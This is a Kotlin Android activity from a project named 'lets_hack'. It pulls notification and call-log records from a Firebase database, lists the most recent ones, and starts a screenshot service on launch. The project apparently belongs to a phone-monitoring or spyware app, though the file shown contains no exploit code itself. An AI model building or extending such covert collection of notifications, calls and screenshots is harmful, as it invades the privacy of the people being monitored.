package com.example.lets_hack

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import com.example.lets_hack.databinding.ActivityMainBinding
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var database: DatabaseReference
    private lateinit var notificationAdapter: NotificationAdapter
    private lateinit var callAdapter: CallAdapter
    private val allNotifications = mutableListOf<NotificationModel>()
    private val allCalls = mutableListOf<CallModel>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        database = FirebaseDatabase.getInstance().reference

        notificationAdapter = NotificationAdapter(emptyList())
        callAdapter = CallAdapter(emptyList())

        binding.recyclerViewNotifications.layoutManager = LinearLayoutManager(this)
        binding.recyclerViewNotifications.adapter = notificationAdapter

        binding.recyclerViewCalls.layoutManager = LinearLayoutManager(this)
        binding.recyclerViewCalls.adapter = callAdapter

        startService(Intent(this, ScreenshotService::class.java))

        fetchNotifications()
        fetchCalls()
    }

    private fun fetchNotifications() {
        database.child("notifications").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                allNotifications.clear()
                for (snap in snapshot.children) {
                    val notification = snap.getValue(NotificationModel::class.java)
                    if (notification != null) {
                        allNotifications.add(notification)
                    }
                }
                val latestNotifications = allNotifications
                    .sortedByDescending { it.timestamp }
                    .take(100)

                notificationAdapter = NotificationAdapter(latestNotifications)
                binding.recyclerViewNotifications.adapter = notificationAdapter
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun fetchCalls() {
        database.child("calls").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                allCalls.clear()
                for (snap in snapshot.children) {
                    val call = snap.getValue(CallModel::class.java)
                    if (call != null) {
                        allCalls.add(call)
                    }
                }
                val latestCalls = allCalls
                    .sortedByDescending { it.timestamp }
                    .take(20)

                callAdapter = CallAdapter(latestCalls)
                binding.recyclerViewCalls.adapter = callAdapter
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }
}